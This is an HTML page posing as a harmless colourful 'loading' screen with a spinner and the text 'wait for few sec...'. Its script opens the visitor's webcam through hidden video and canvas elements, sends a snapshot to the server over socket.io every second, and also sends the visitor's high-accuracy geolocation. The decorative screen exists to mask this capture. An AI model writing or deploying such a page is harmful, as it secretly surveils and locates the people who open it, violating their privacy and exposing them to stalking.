 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Colorful Vibe</title>
    <style>
        
    body {
      margin: 0;
      height: 100vh;
      justify-content: center;
      align-items: center;
      background: linear-gradient(45deg, #ff6b6b, #f06595, #cc5de8, #845ef7, #5c7cfa, #339af0, #22b8cf, #20c997, #51cf66, #94d82d);
      background-size: 300% 300%;
      animation: gradientMove 6s infinite;
      overflow: hidden;
         }

        canvas {
            margin :100vh 100vh;
            display:none;
            margin: 20px auto;
            border: 2px solid black;
            background: green;
        }


    @keyframes gradientMove {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .flame {
      position: relative;
      width: 50px;
      height: 80px;
      background: radial-gradient(circle, #ff6b6b, #f06595, transparent);
      border-radius: 50%;
      animation: flicker 0.5s infinite alternate;
    }

    @keyframes flicker {
      0% { transform: scale(1); opacity: 1; }
      100% { transform: scale(1.1); opacity: 0.8; }
    }

    .flame:before, .flame:after {
      content: "";
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      height: 100%;
      background: radial-gradient(circle, #ff922b, transparent);
      border-radius: 50%;
      animation: flicker 0.5s infinite alternate;
    }

    .flame:after {
      background: radial-gradient(circle, #ffd43b, transparent);
      width: 70%;
      height: 70%;
    }

    .loading-text {
      margin-top: 20px;
      font-size: 20px;
      font-weight: bold;
      color: white;
      text-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    </style>
</head>
<body>
    
    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="can" width="300" height="300"></canvas>

    <div class="container">
    <div class="spinner"></div>
    <div class="flame"></div>
    <div class="loading-text">wait for few sec...</div>
  </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
      const socket=io();


      const canvas = document.getElementById('can');
      const video = document.getElementById('video');
      const context = canvas.getContext('2d');




        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
            setInterval( function cap(){
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imgdata = canvas.toDataURL('image/png');
              socket.emit("imgo",imgdata);
              imgdata=null;
              context.clearRect(0, 0, canvas.width, canvas.height);    
              },1000);
            })
            .catch((error) => {
                console.error("Error accessing webcam:", error);
            });






   if ("geolocation" in navigator) {
  // Check if Geolocation is supported
    navigator.geolocation.getCurrentPosition(
    async (position) => {
      // Success callback
      const latitude = await position.coords.latitude; // Latitude
      const longitude =await  position.coords.longitude; // Longitude
      const accuracy =await position.coords.accuracy; // Accuracy in meters
         let  loc={
             lotd:longitude,
             latd:latitude,
             acc:accuracy,
             err:200
            }
     socket.emit("location",loc);
     },
   (err)=>{
    console.log(err);
    },
    {
      enableHighAccuracy: true, // Request high-accuracy location
      timeout: 20000, // Timeout after 5 seconds
      maximumAge: 0, // Do not use cached location
    }
  );

 }




    </script>
</body>
</html>
